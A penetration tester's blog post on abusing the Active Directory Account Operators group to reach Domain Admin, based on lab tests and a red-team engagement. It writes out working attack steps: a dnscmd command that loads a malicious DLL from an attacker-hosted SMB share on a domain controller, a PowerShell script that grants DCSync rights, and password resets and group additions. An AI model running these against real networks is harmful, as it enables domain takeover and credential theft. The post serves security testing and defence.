# Account Operators Privilege Escalation
![Screenshot of code by White Oak Security’s expert pentesters & red teamers say “Local group memberships, account operators, global group memberships, domain users, the command completed successfully.” this blog is about account operators privilege escalation. ](https://blog.cyberadvisors.com/hs-fs/hubfs/Imported_Blog_Media/DE8883AB-EC0E-4910-893C-E8CB25581A63.jpeg?width=488&height=73&name=DE8883AB-EC0E-4910-893C-E8CB25581A63.jpeg)

On a recent Red Team engagement, we had compromised a domain and dumped the Active Directory user password hashes. We attempted to pivot into another domain using shared credentials, but no domain administrator accounts shared credentials between the two domains. However, we did identify one account that shared credentials with the target domain which was in the “Account Operators” group, a default Active Directory group that I have flagged in my notes as a candidate for easy privilege escalation to Domain Administrator (**DA**) privileges.

Practical Privilege Escalation
------------------------------

While I have read several articles describing this potential attack path, there seems to be some confusion over what permissions this account actually has. The goal of this post is to share some details of the Account Operators permissions and describe practical paths to escalating to DA. 

Account Operators
-----------------

A description provided by a [Microsoft article](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators), describes the Account Operator default group and the permissions of the group as:

> _The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including accounts for users, Local groups, and Global groups. Group members can log in locally to domain controllers._
> 
> _Members of the Account Operators group can’t manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group can’t modify user rights._
> 
> _The Account Operators group applies to the Windows Server operating system in the Default Active Directory security groups list._
> 
> [Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators)

### Account Operator Permissions

Essentially, Account Operators can do the following:

*   Log on locally to domain controllers (no local admin by default)
*   Modify Local and Global groups besides the protected groups (Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups)
*   Modify user accounts including updating passwords (besides members of the protected groups) 

Testing Potential Paths to DA
-----------------------------

Using an Active Directory test lab, I tested the most obvious paths to escalation first to ensure that the described permissions actually held true. I created the user “**AO**” and added their account to the “Account Operators” group:

![Screenshot of code by White Oak Security has red box highlights that say username - AO and Local Group Memberships - *Account Operators ](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/wc4B9KH65puSiP8rVo9SfWEGhHrKlpKi75bue4Id7VMQFQLy8-PEUuC_fAAsPrBdk62XvYdPJTMh0LHzIExfvQjbw7JJMwwhvwCMKD04qcDP9qbuTUyNDZ0updsk58FW_PlqSWsfieEF72ceTPk1kL29d3aRhpnjtT_Y-yNmcNnOddP7pvfVMXnU6AumEw.png)

Modification Of Protected Administrator Groups & Users
------------------------------------------------------

The default “Administrators” group contains the groups “Domain Admins”, “Enterprise Admins”, and the “Administrator” user. Attempting to modify any of these groups fails with “permission denied” as expected:

![The default “Administrators” group contains the groups “Domain Admins”, “Enterprise Admins”, and the “Administrator” user. Attempting to modify any of these groups fails with “permission denied” as expected, in this screenshot by White Oak Security ](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/hdNc8cmKE-wBaYnU5IYNl3_p8DAXGuimiAJOSMY2Pphjb5Uhd1W02wGRtXWG20AOLj_Se-uBegArQXDz8YwluhzObIuRkfsgaL3pjNpFf7SvEcwTLGCvnQ8UgJDCRDHJqIJ-8Vk5ntPODqbYy_7kwh5rk85i7OnFD4epeRTNJ9Mzul_1Wf9FI1VaxgvsUw.png)

Additionally, attempting to modify the password for any of the accounts in these groups fails as well:

![Access is denied after system error 5 occurred in this code screenshot by White Oak Security ](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/hDL2g45g4sXAJ6gtNBUDK7n8Nj1QSbk_ANbYsDUW10XA-QYX4NpuDOYECYa9EcEGMTO0DKJuf9Gvd9_mXLDmqjs-hFSUpfW4A8DCku7Kcs31EFagJtw7PyseQ0RTucXNL-0qa3TnLdO25aG89vNytiAtuM4g8mdm3iNb9YtjuSOLl0UsE5dbupxAPZlOqQ.png)

Modification Of Protected Subgroups
-----------------------------------

One scenario that I saw mentioned elsewhere is modifying subgroups of the Administrators or Domain Admins groups, as the ACL is supposedly not passed down to the subgroup. The group “SecondaryDA” was created as a member of the “Domain Admins” group. Attempting to add any user to this group as the account operator fails, suggesting that the ACL is properly inherited and prevents this method of escalation:

![The group “SecondaryDA” was created as a member of the “Domain Admins” group. Attempting to add any user to this group as the account operator fails, suggesting that the ACL is properly inherited and prevents this method of escalation In this screenshot of code by White Oak Security ](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/qhhXP5z0fNQLQGS79VSqVqSPG8ALMnZ7qHyOlucFyJMKv9Jo_gaRnDameqBLClgmeHz1gbzKcOGDnnGy4QzpCSP5u44CruBnHZ8cUU0pDOE6ZAVks19aYIqHzcCo7YtR4svQuETbAOU7t8Z-_tpaL-bT2msSAAFGdIC9L6c8coCSX_EHYYpNFIL4b4KgMw.png)

This was tested with all the protected groups with the same results. Interestingly, if a new group is created in a non-default OU (not Users or BUILTIN) and then placed in a protected group, it is initially possible to modify this group as an Account Operator. However, after a period of time (about 5-10 minutes in my test lab) the Access Control List seems to propagate to the subgroup and modification by the Account Operator then fails.

Changing User Passwords
-----------------------

Account Operators can modify user objects for any user that is not a member of one of the protected groups listed above. This means that if you find a user that is not a Domain Admin but has administrative access to a sensitive server, you can simply modify their password and log in as them. For example, you identify ADMIN\_john.doe is not a member of any of the protected groups but has local admin access to a server running an IT password manager software, it is possible to compromise their account by resetting their password:

![Code screenshot shares that the user admin John.doe and newbadpassword123 was completely successfully. ](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/yOIsjPnGxVKdQnavPIsikuqolVTs42i54QiFIDIHZKppnqopa08IErplneWs545PCdXCWdLD01Xi5SnAyyo5HxJ7CpJq6iNmNTlGCSXsOpU5SbT9OfEPQwHunh3lBu4p3bGhq2sF3fzhWkpnJANof2IuF60OO0U_JQL_eIqr7L_Ecsz-4qcp9jEUgM5lYA.png)

### High-Value Default Groups

The following default groups have direct paths to DA privileges:

#### DNSAdmins

Members of the DNSadmins can modify DNS settings on DNS servers, which are often domain controllers, leading to code execution as SYSTEM on the domain controller. This method requires the following steps:

1.  Gain access to a user in the DNSAdmins group either by adding a compromised user account to the group or modifying the password of an existing user in the group.

```
Add-ADGroupMember -Identity "DNSAdmins" -Members AO
```


2.  Gain access to the **_dnscmd_** tool, either through powershell/cmd access to a Windows Server or through installing Remote Server Administration Tools on a Windows Desktop. 

3.  Generate a malicious DLL to be run by the DNS service to gain code execution. This can be hosted remotely via SMB to avoid writing to disk (see below link for details on making this). **_Note that if the DLL crashes the DNS service, with only default DNSadmin permissions you likely won’t be able to bring the service back up._**

4.  Run the following command to configure the DNS service to use your malicious DLL:

```
dnscmd DC01.test.lab /config /serverlevelplugindll \\[attackerip]\SHARE\dns.dll
```


5.  Restart the DNS service on the domain controller (by default, DNSadmins do not have permissions to restart the service via the “sc” command, but can do it with dnscmd):

```
dnscmd DC01.test.lab /restart
```


6.  The DNS Service should now grab our DLL from the SMB Share and execute its contents, resulting in code execution as SYSTEM on the domain controller/DNS Server.

![Code screenshot by White Oak Security’s redteamers of the SecureAuth being authenticated successfully.](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/bnypY7Pn4iR18kvrfO6oiSHasTv5wrcdYM6JwQW-eV4BzC67LOn2e3ATxmjercbN0IZIRcn900smXuej-duQtQXhry2vLZUdoaIjMPZPJ7sG1VcMVXznUyX93YDdlRpruz4YjjsKvSgppGxa-UeJagxT0S3is6uJFwIO6GxeM_gKz6NzoqgmOIaxvN1ZJw.png)

For more information on this attack and constructing the DLL to be used by the DNS service, this [abusing dnsadmins post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) or [this dnsadmins post](https://www.semperis.com/blog/dnsadmins-revisited/) are great examples.

#### Exchange Windows Permissions

In environments that use Microsoft Exchange, the Exchange Windows Permissions group allows for privilege escalation to DA. Essentially, members of this group have permission to grant themselves DCSync privileges, and this attack path has been determined to be a “Won’t Fix” issue by Microsoft. Read this [GitHub article which explains the attack in detail and provides the steps to exploit](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md).

This method is straightforward and consists of two steps:

1.  Add yourself or another compromised account to the group:

```
Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members AO
```


2.  Grant yourself Ds-Replication-Get-Changes and Ds-Replication-Get-Changes-All extended rights (bolded items must be modified to match your domain environment):

```
$acl = get-acl "ad:DC=test,DC=local"
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$user = Get-ADUser -Identity $id.User
$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
# rightsGuid for the extended right Ds-Replication-Get-Changes-All
$objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$identity = [System.Security.Principal.IdentityReference] $sid
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
# rightsGuid for the extended right Ds-Replication-Get-Changes
$objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
Set-acl -aclobject $acl "ad:DC=test,DC=local"
```


#### Azure Admins

With some Azure AD configurations, it is possible to exploit the Azure-ADConnect integration service to obtain and decrypt credentials for the Azure AD Replication account, which effectively has DA privileges. This replication method appears to have been hardened in 2020, requiring some additional steps to exploit. See the following links for proof-of-concept code and a detailed description of the attack:

*   [Azure AD Connect for Red Teamers](https://blog.xpnsec.com/azuread-connect-for-redteam/) 
*   [GitHub: HTB](https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html) [Monteverde](https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html)

High-Value Non-Default Groups
-----------------------------

Another way to obtain domain privilege escalation is to modify non-default groups that may have sensitive access. For example, there may be a group called “IT Admins” that is not a member of a protected group, but grants local admin access to numerous high-value servers. This group is an easy target that we can add our own compromised user to or modify the password of an existing user within the group.

![For example, there may be a group called “IT Admins” that is not a member of a protected group, but grants local admin access to numerous high-value servers. This group is an easy target that we can add our own compromised user to or modify the password of an existing user within the group. Screenshot by White Oak Security.](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/XBx2UQ50BSoZSZp-zb_XVmtnQjFQWODfBEwMZCEtaORRlHFVqIQL58OJmw_w550FCx0t8bRIlGoDptepF8eIgerAkTE1pBLK4nLbIAGypK8RKRcjFdgecrA8EGWC9-4Shrp90xbahrRaeTpF2U6B1l00gA9jCow6QdmBC0moSaE_kYKI6Yw7tLaB0aMdpQ.png)

Account Operators Privilege Escalation Wrap-Up
----------------------------------------------

The default Account Operators group is often just one step away from Domain Administrator privileges. It allows attackers to change user passwords or group membership for any user or group not within the protected groups. For attackers, this is a useful group to achieve privilege escalation to DA or maintain less obvious persistence within an environment. For Defenders, this group should be monitored, and users within the group should be considered to have DA privileges. 

### Written By: Talis Ozols
